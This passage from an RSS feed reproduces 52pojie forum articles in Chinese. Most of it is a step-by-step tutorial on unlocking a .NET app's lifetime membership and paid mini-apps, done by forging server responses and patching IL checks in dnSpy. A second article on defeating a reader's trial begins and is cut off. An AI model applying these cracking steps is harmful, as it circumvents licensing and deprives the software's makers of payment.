src="https://wechat2rss.xlab.app/img-proxy/?k=58142e00&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKQflG9MgmGgF2epvUUMZIjViaJMgtyePQbpA6HibxUWxNsbN06U8fibX2zIaBfSDpFib46N6pdXAunuw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>我们把json格式化一下</p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=ea676ba9&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKQflG9MgmGgF2epvUUMZIjXmWC3zibicOpzj4DNOWyDxYia0Cia0CdgSLXh2Voibg5wawWN4xby2fv1AQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><h3>伪造响应</h3><p>重要数据都出来了，我们直接在HttpDbg里面修改响应的status为1</p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=f2c09349&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKQflG9MgmGgF2epvUUMZIjJXh8pId1GRh5PFVSO2QmXeTMF90S1JhceJB7uKIok7ZcywQWnsribUQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>不对了，现在怎么提示离线版本了，右键菜单也没会员选项了</p><p>刚开始以为有校验，仔细看了下伪造的响应，发现回复的数据比之前的数据小</p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=c4a570c8&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKQflG9MgmGgF2epvUUMZIjhS8PH0ib70lIvJVIMnhSfL0ib0TicZSvYPK5DKr4Guez59esFEjJ5wvfg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>是被自动回复截断了，改成用文件回复</p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=8e99efb9&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKQflG9MgmGgF2epvUUMZIjYyE5GPzh1ic8STAzPnwTK6nkict82bjtzMmKIib3dYkV9VSBeB3U0pfkg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>然后在文件里面改下数据，就可以正常回复，这时候我们再重新打开软件，可以显示会员信息了，但是我们打开会员信息发现和之前的没有变化</p><h3>伪造获取用户信息响应</h3><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=9a972d8b&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKQflG9MgmGgF2epvUUMZIjlQomZNz2quSDNLC6FFTsJWGRmEpRFpqavyCabHrXYia5tLUPjnJCpxA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>但是在httpdbg上可以看到有一条新的请求</p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=317da9bd&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKQflG9MgmGgF2epvUUMZIj4OBgoJcKvwHjHQ3CiaBV9V8icpwH4VNfwudAuKAxvQ8VlTA3UiaPBGsBw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>和登陆请求差不多，也是获取信息的，那我们把这条请求也进行伪造</p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=b7099ef4&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKQflG9MgmGgF2epvUUMZIjcV5tdIryyEYsHnfwsvz5wtwy4jHc0viaiaAkukJBUYsXicQTtfxJnSj1Q%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>伪造完了点一下刷新用户信息</p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=f89dd7eb&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKQflG9MgmGgF2epvUUMZIjXvsSNgPAz73MvWULrRHcmQXcOBIyMhsvQ3DllIVkzcjVeCDyNOZibiaA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>可以看到我们已经变成终生会员了，至此，会员部分就分析完了。</p><h2>小应用部分</h2><p>刚开始一直不知道这个积分有什么作用，但是他放在这里就肯定有放在这里的原因，仔细去找了找，发现了个好玩的地方---应用中心</p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=31bc7757&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKQflG9MgmGgF2epvUUMZIjibE34SB7609VC5XNRl43hRsvaahkrIrFVWnU33a8IAjgv7lGCCjYXCw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>这里有一些其他的小软件，需要消耗积分下载，我们点击公考行测两万题下载，提示了积分不足，看看请求和响应</p><p>响应如下：</p><p><code style="font-family: SFMono-Regular, Consolas, ;">﻿{"status":402,"msg":"\u60a8\u7684\u5206\u4eab\u503c\u4e0d\u8db3\uff0c\u65e0\u6cd5\u4e0b\u8f7d\r\n\u8bf7\u524d\u5f80\u3010\u7cfb\u7edf\u3011-\u3010\u6ce8\u518c\u3011\u6a21\u5757\u83b7\u53d6\u66f4\u591a\u7684\u5206\u4eab\u503c"}</code></p><p>根据前面的响应我们就能猜到这个正确响应的状态码应该是200，我们改成200试试</p><blockquote><p style="margin-bottom: 15px;">这里不赘述怎么修改响应了，和之前的一样方法，只是需要注意自动回复设置成“含有”URL，因为每个App的ID是不一样的</p></blockquote><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=1f958ecd&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKQflG9MgmGgF2epvUUMZIjnsWuaMSuUtBxUJTfVGib3ukMRiaukK6r1gnnOtK0ErRUJxsOhlNvONFQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>可以看到开始下载了，下载完点击打开又出问题了</p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=62070eab&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKQflG9MgmGgF2epvUUMZIjzRARl1DRnicI7glD6WxN6c1a8cYNQCQX2R787Y4yS7A25SwoCk4y8kQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>提示你妹购买，看来还有二次检测。</p><p>同样的方式，在HttpDbg里面看请求，有一条 “checkApp” 的请求，把他的状态码也改成200</p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=582583f3&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKQflG9MgmGgF2epvUUMZIjKbh3JMGvWMKbWiaePwqYwVjSGiaoqU7OqY5fHWaQunbUibLV3rcj9f01g%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>现在就能正常打开了，答题功能也能用，其他的APP也是同理了，但是我们退出之后再进来应用中心，发现又变成下载了，虽然每次都能正常打开，但是每次都要下载还是挺麻烦的。这个状态每次重开应用中心就会被重置，那肯定有网络请求。</p><p>和前面的一样，仔细看就会有个getAppList请求，分析请求就可以发现，你已有的应用的status是1，没有的就是0</p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=10316bd5&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKQflG9MgmGgF2epvUUMZIjlJcOE4lwoP8iaGqjr1O9T3oO9KEPe2GApFRFDsE6kwQY3Y3UI9mtxvQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>手动把这些状态全部改成1，就可以看到我们已经下载过的APP就不会需要再次重新下载了。</p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=c2d1b527&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKQflG9MgmGgF2epvUUMZIjeDKyd3bIjMkgge9ayzJdkb58VSw1Iib8IA3xHyQsrtJJowaGoNNOU6g%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>至此，伪造响应破解的分析就完成了，要写成代码很简单，就留给评论区的大牛们去做了。我们开始下一步，Patch程序。</p><h2>分析程序</h2><p>前面已经说了，判断是不是会员的关键点在BindRegister()这个函数里面，关键点就在Bis.LoRes.UserStatus = regResult.Status;在这里设置了用户的会员状态。</p><h2>修改</h2><h3>修改会员</h3><p>我们已知永久会员的状态是1，直接右键编辑IL指令</p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=ce4eef94&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKQflG9MgmGgF2epvUUMZIjia5IrRUEuMLNVjLFzMYv13Ooibiarr1stb1fWeDhI09dQQIJSBtWReTJg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>我们先把这两句选中，右键用NOP替换，然后在15行填上idc.i4.1（常数1），然后点确定</p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=f2d18c01&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKQflG9MgmGgF2epvUUMZIjYc3ibthq18aj1rEav1ic0NHnMTHdCANQyg5LUbeFuFJcNHtG9iaicG3cNw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>可以看到代码里面赋值的地方已经被我们替换成一个常量了。注意看下面的switch语句，判断的是服务器返回值的status，所以还需要修改一下，和上面的同理。</p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=176a98c0&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKQflG9MgmGgF2epvUUMZIj4L0e1xBQjyEZydJXf9yoqfy6qt6P4OYnEvsKQ02RP0LGVoMF4Fp9NQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>上面的这个修改了之后switch就变成判断1了，其实也可以改成本地的数据判断，就是改Call，但是我懒得改了，有兴趣的话自己研究一下，不难。</p><p>然后 左上角-》文件-》全部保存，可以加点后缀，比如破解会员，避免自己搞混了，然后再运行</p><blockquote><p style="margin-bottom: 15px;">要注意，dnspy的调试必须先保存再调试才有效果，我们暂时不需要调试，所以保存了之后直接去打开这个exe看效果</p></blockquote><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=383d42dd&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKQflG9MgmGgF2epvUUMZIjfvULUdmGSE9fXeEMA4vuSG6z94L0PEPlQ8SPnuv3kT5JLojSGo6dLg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>可以看到我们已经变成终身会员了，会员功能也有效果</p><h3>修改应用中心</h3><h4>修改下载</h4><p>应用中心和之前的一样，下载会判断，所以需要修改判断点，直接在dnspy搜索“需要消耗”，搜出来的第一个就是弹窗提示的内容</p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=56c65f80&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKQflG9MgmGgF2epvUUMZIjiau1W8arTOtda8kkLDrIwZFloOwcPLeFwtGicIDSuukPUDNttW1oPBog%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>我们点进去可以看到很明显的get请求，判断状态是不是等于200</p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=9f6def9a&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKQflG9MgmGgF2epvUUMZIjVkDZRiaq8q2eFwIoDCdoqVAU2c14wHiau54hTvxSLdVjv2jMXRBSPYHQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>直接右键-》编辑IL指令，这里有几种改法，一个是改成0不执行，跳过这段代码，另一个是取反，让他等于200的时候才提示不足，或者直接删除return等等，我们这里直接取反</p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=8d437598&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKQflG9MgmGgF2epvUUMZIjWWwjbCibNRTIBeTcIVFibK7sCyj7z8z4gTdabVrUtPRC6X0okLKfNZsA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>选择这4条语句，右键反转分支即可，因为我们没有积分，返回值必定不可能是200。</p><blockquote><p style="margin-bottom: 15px;">这里修改完之后再保存一下，然后看效果。最好做一步保存一步，这样即使有问题闪退了，也能在上次修改保存好的文件基础上再改</p></blockquote><p>这里已经可以下载了，但是打开和之前的抓包一样，有二次检测会提示没有购买，所以要找一下检测的点并且修改。</p><h4>修改二次检测</h4><p>二次检测稍微麻烦一点，因为提示的内容是服务器返回的，搜不到字符串，所以要跟一下流程。</p><p>我们先返回上一步修改下载的位置，可以看到这一块是打开App的，但是没有调用函数，只是改了状态</p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=a23725c1&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKQflG9MgmGgF2epvUUMZIjLibbKu5d1MSia58h3OrQYzuG63XjVy5ESwYI68K4dpibNfgPKJ2NtRQEg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>所以我们这一步要右键这个this.start然后点击分析，可以看到读取和赋值都是那个函数调用了，追一下可以追到下面这个函数<br /></p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=2100a279&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKQflG9MgmGgF2epvUUMZIjicTbicFribVrS1iavaOq8lJLA3SOiaFLqeY1xkdGzITBuxQkGIo15VX4K4w%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>代码精简了，分开看就知道是在干嘛了</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(146, 255, 184);">// 动态加载指定路径的DLL文件</span><br /><span style="color: rgb(255, 255, 182);">Assembly</span> <span style="color: rgb(198, 197, 254);">assembly</span> = Assembly.LoadFile(Util.GetAppPath(<span style="color: rgb(168, 255, 96);">"/app/"</span> + app.Path) + <span style="color: rgb(168, 255, 96);">"/"</span> + app.Path + <span style="color: rgb(168, 255, 96);">".dll"</span>);<br /><span style="color: rgb(146, 255, 184);">// 获取assembly中指定类名的Type对象</span><br /><span style="color: rgb(255, 255, 182);">Type</span> <span style="color: rgb(198, 197, 254);">type</span> = assembly.GetType(app.ClassName);<br /><span style="color: rgb(146, 255, 184);">// 使用反射创建type类型的实例</span><br /><span style="color: rgb(255, 255, 182);">object</span> <span style="color: rgb(198, 197, 254);">obj</span> = Activator.CreateInstance(type);<br /><span style="color: rgb(146, 255, 184);">// 如果obj实现了IACSetter接口，将调用其SetIAC方法</span><br /><span style="color: rgb(150, 203, 254);">if</span> (obj is IACSetter setter){<br />    <span style="color: rgb(146, 255, 184);">// 创建一个AppController实例并传给SetIAC方法</span><br />    setter.SetIAC(<span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">AppController</span>(app));<br />}</code></pre><p>进这个类就可以看到<br /></p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=af45356c&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKQflG9MgmGgF2epvUUMZIjaJGEozc06Zyt8KXjWva4Of7rRbOABDKJNoUIGQkJW4jSdFtWR3tCZw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>这个检测函数了，但是这个检测函数值负责返回，不判断。分析也没有发现调用，那说明是小App的DLL调用了这个方法，小APP有点多，不可能一个个去改，这个函数留给我们的操作空间也不是很多，因为没有声明临时变量，所以修改ApiResult的内容还挺麻烦的，那我们换个思路，让他请求一个返回status返回200的地址。</p><p>打开抓包软件，看看软件请求的哪个数据一直都是200返回值的</p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=221f69a6&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKQflG9MgmGgF2epvUUMZIjJFtrbgsFw6Pfxg8moTYdhj0I0HV3hemjMzSFfkQ69a7aswuD7ZBt7g%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>找到了一个符合要求的，这个是每次退出都会调用的，我们吧参数改一下看看是不是还返回200</p><p>经过测试修改参数之后返回的还是200，说明没对传入的参数检测</p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=0be03469&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKQflG9MgmGgF2epvUUMZIjlicjBfibVjTH6rTiaL0BibFv8J4rfmBndDbqiahpOMfdWsKItkVh9kerAeA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>那我们修改一下访问的路径</p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=211f812f&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKQflG9MgmGgF2epvUUMZIj5kAYciajPbO8z4cfB4rNeDpicd3Swz39y4cpLkX7yknCGBh5Xf2mzcVA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>直接右键编辑C#方法，把这个改成active.php或者修改获取的改成获取active的。</p><p>保存，测试</p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=0504b136&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKQflG9MgmGgF2epvUUMZIjST4Bszsed6tl35K3tkYYKPL6VqxKvSMQt9bOhFP3Jo1qcOWqHsibl7w%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>OK，可以打开了，但是我们还是遇到了和抓包破解一样的问题，每次都要重新下载。</p><h4>处理状态检测</h4><p>我们再去找状态检测的地方，继续返回到修改应用中心的地方，在这个类里面可以看到有添加item到列表的操作，那我们就看看在哪里设置了按钮的状态，往上翻翻可以看到一个private void SetActionStyle(ReApp <span style="font-weight: 700;">app</span>) 的函数设置了按钮的状态，</p><p>这里是用switch语句判断添加的</p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=d54111e5&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKQflG9MgmGgF2epvUUMZIj8Ybj2miaXMiaibk1571icuNvz3LcHfLHtzSCCKdpSkWUqqWia2heLpXEHQg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>我们点击这个成员变量，找到他定义的地方（这里直接点分析是不行的，因为他是初始化过的一个Map（字典）），要找往字典添加的方法调用，所以先跳转到它定义的地方，因为是个私有变量，所以肯定在这个类内部添加的数据，在代码搜索btnActions</p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=5a0f99b2&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKQflG9MgmGgF2epvUUMZIjDJPbLRKsK7yHyJyBbut9q7a0E0icjGnMqmhBCwaTB2z24oDwMR1492Q%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>很容易就能找到赋值的地方，关键点就是这个<span style="font-weight: 700;">rApp</span>.Status == 1，那我们就把这个判断去掉，右键，编辑IL指令</p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=150ea0ed&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKQflG9MgmGgF2epvUUMZIjw1AoNG0ZfianibocdGkwUjnb5siafgQn3qbRbma8LI4EPFjX2IcdTtM4Q%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>修改后的C#代码如下<br /></p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=64587eb1&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKQflG9MgmGgF2epvUUMZIjXbbgCKeyDDFPHUu4vSQ1UkBfHd4ALWwSUB280yRcHNzjWYMYCRevTw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>这样就没有状态判断了，默认都是已经购买了的。</p><p>我们保存打开看看效果（和上面图一样，我就不贴了），可以看到下载了的软件默认就是打开按钮，不需要再次下载了，至此，分析结束。</p><blockquote><p style="margin-bottom: 15px;">具体的IL指令代表的什么意思就不解释了，可以百度或者问GPT都可以得到很好地回答。</p></blockquote><p>这个软件分析没花多久，我个人认为这个软件比较简单，很适合新手练手，不管是Patch技巧还是抓包姿势都很适合。但是还是那句话，只做分析讨论，不提供成品，如有需求请支持正版。</p><p style="line-height: normal; margin-bottom: 0px;"><br /></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; color: rgb(53, 53, 53); text-align: start; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><strong><span style="color: rgb(0, 176, 80);"><strong><span style="color: rgb(255, 255, 255); background-color: rgb(0, 176, 80);">-官方论坛</span></strong></span></strong><br /></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span>www.52pojie.cn</span></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span><br /></span></p><p></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span style="background-color: rgb(255, 251, 0); letter-spacing: normal; font-size: 24px;"><strong><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; letter-spacing: 5px; text-align: start; background-color: rgb(255, 255, 255);">👆👆👆</span></strong></span><span style="background-color: rgb(255, 251, 0); font-size: 16px; letter-spacing: normal;"><strong><span style="text-align: start; font-family: Arial, sans-serif;"><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; font-size: 20px; letter-spacing: 5px; background-color: rgb(255, 255, 255);"></span><strong style="font-family: Tahoma, Helvetica, SimSun, sans-serif; letter-spacing: 0.544px;"></strong></span></strong></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">公众号<span style="color: rgb(255, 0, 0);"><strong>设置“星标”，</strong></span>您</span><span style="font-size: 16px; color: rgb(255, 0, 0);"><strong>不会错过</strong></span><span style="font-size: 16px;">新的消息通知<span style="color: rgb(247, 49, 49); font-family: Arial, sans-serif; font-size: 13px; text-align: start;"></span></span></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">如</span><strong style="font-size: 16px; letter-spacing: 0.544px;"><span style="color: rgb(255, 0, 0);">开放注册、精华文章和周边活动</span></strong><span style="font-size: 16px;">等公告</span></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;"><br /></span></span></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><img class="rich_pages wxw-img" /></p><p style="display: none;"></p>



<p><a href="https://www.52pojie.cn/thread-1950441-1-1.html">阅读原文</a></p>
<p><a href="https://wechat2rss.xlab.app/link-proxy/?k=8d8a33c3&amp;r=1&amp;u=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMjM5Mjc3MDM2Mw%3D%3D%26mid%3D2651141137%26idx%3D1%26sn%3Dfb0f616c3a6618e348899a2abee46b83%26chksm%3Dbd50a4458a272d535595e3f3d916ce851887a825064d579fc1604e9f079487babe5dde3c181d%26scene%3D58%26subscene%3D0%23rd">跳转微信打开</a></p>
]]></content:encoded>
<pubDate>Thu, 15 Aug 2024 18:29:19 +0800</pubDate>
</item>
<item>
<title>记录第一次破解 .NET单行阅读器无限试用</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651141093&amp;idx=1&amp;sn=abcba6bfd4b896957c83ae4c64b0669d&amp;chksm=bd50a3b18a272aa751100e480c25700596f784c656649cd7888569066676e5caa7870d09fa63&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651141093&amp;idx=1&amp;sn=abcba6bfd4b896957c83ae4c64b0669d&amp;chksm=bd50a3b18a272aa751100e480c25700596f784c656649cd7888569066676e5caa7870d09fa63&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<p>
原创 <span>吾爱pojie</span> <span>2024-08-14 16:50</span> <span style="display: inline-block;">北京</span>
</p>

<p>近在上班摸鱼的时候发现了一个好用的阅读器，他只有一行文字，可以完美的隐藏在屏幕里面，光明正大的摸鱼而不被老板发现。</p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://wechat2rss.xlab.app/img-proxy/?k=9dd82345&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZJ4T0sRevGbOIEE9S4wffqUVUaffHg2H8xT0dWMnMOPOTxob2O6Apd4LGq61aiaVebsj2CMwYJs2kQ%2F0%3Fwx_fmt%3Djpeg" />
</p>

<p style="margin-bottom: 0px; line-height: normal;"><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span style="font-size: 24px;">作者</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span style="font-size: 24px;">论</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span style="font-size: 24px;">坛账号：adogs</span></strong></p><p style="margin-bottom: 0px; line-height: normal;"><br /></p><p style="margin-bottom: 0px; line-height: normal;"><span>最近在上班摸鱼的时候发现了一个好用的阅读器，他只有一行文字，可以完美的隐藏在屏幕里面，光明正大的摸鱼而不被老板发现。</span><br /><span>具体效果如下：</span><br /><img class="rich_pages wxw-img" height="676" src="https://wechat2rss.xlab.app/img-proxy/?k=1678594f&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ4T0sRevGbOIEE9S4wffqUSUuhB8Fk9613lX8Z2BE1oqltm5LQqPQY5rgLLzDReFBg4913sUgkow%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; width: auto;" width="768" /><br /><span><br /></span></p><p style="margin-bottom: 0px; line-height: normal;"><span>但是用了几天之后发现，发现试用天数已经到了，必须要充值才能继续使用。</span><br /><img class="rich_pages wxw-img" 